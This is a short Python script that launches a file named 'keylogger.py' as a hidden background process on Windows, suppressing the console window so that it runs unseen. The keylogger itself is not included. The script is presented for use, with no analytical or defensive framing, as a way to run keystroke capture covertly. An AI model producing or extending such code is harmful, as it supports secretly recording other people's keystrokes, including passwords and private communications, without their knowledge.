import subprocess

def run_script_background(script_path):
    subprocess.Popen(["python", script_path], creationflags=subprocess.CREATE_NO_WINDOW)

if __name__ == "__main__":
    script_to_run = "keylogger.py"  # Path to your keylogger script
    run_script_background(script_to_run)
